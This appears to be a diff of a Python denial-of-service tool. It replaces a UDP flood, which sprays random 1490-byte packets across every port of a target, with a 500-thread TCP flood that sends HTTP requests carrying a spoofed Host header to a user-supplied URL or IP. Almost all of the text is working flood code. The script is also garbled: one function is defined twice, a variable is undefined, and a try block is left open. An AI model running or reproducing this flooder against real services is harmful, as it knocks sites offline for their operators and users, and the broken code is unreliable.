@@ -88,50 +88,51 @@ yellow = "\033[1;33m"
 white = "\033[1;37m"
 default = "\033[0m"
 
-fackip = "77.109.33.232"
-Counter = 0
-
-def attack():
-  while True:
-   s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
-   s.connect((ip , port))
-   s.sendto(("GET /"+ip+"HTTP/1.1\r\n").encode("ascii"),(ip , port))
-   s.sendto(("Host:"+fackip+"\r\n\r\n").encode("ascii"),(ip , port))
-  
-   global Counter
-   Counter += 1
-   print(f"{red} please Check Your Internet Connection {default}")
-   s.close()
-
-####### we will send requests #######
-def req_send(ip,port,byte):
-  sock = socket(AF_INET,SOCK_DGRAM)
-  send = 0
-  while True:
-    sock.sendto(byte, (ip,port))
-    send += 1
-    port += 1
-    print (f"{green}Sent{red} {send}{green} packet{blue} {ip}{green} port: {yellow}{port}{default}")
-    if port == 65534:
-      port = 1
-
-if __name__ == "__main__":
+#########################################################################
+#ip
+url = input("\033[94m╔═══\033[91m[ Url ] •\n\033[94m╠══>\033[0m ")
+url_chek =requests.get(url)
+ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
+print(ip)
+time.sleep(2.5)
+#########################################################################
+# MAIN MENU 
+print()
+target = str(input("\033[94m╔═══\033[91m[ IP ] •\n\033[94m╠══>\033[0m "))
+port = int(input("\033[94m╠═══\033[91m[ PORT ] •\n\033[94m╠══>\033[0m "))
+clear()
+print("\033[94m")
+#########################################################################
 
 ############ we will take input#####
 try:
     ip = input("\033[94m╔═══\033[91m[ Enter Target IP ] •\n\033[94m╠══>\033[0m ")
     port = int(input("\033[94m╠═══\033[91m[ Enter Port ] •\n\033[94m╠══>\033[0m "))
-    
-    if not (ip == "" or port == ""):
-      byte = _urandom(1490)
-      req_send(ip,port,byte)
-    else:
-      print(f"{red}IP address and Port number is required {default}")
-      exit()
-except ValueError:
-    print(f"{red}Port number must be int not a str{default}")
-    exit()
-except Exception as err:
-    print(f"{red}{err}{default}")
-    exit()
+############ we will take input#####    
+   fake_ip = '77.109.33.232'
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+    attack_num = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        print (f"{green}Sent{red} {send}{green} packet{blue} {ip}{green} port: {yellow}{port}{default}")
+        s.close()
 #print('Atacando porta 💥')
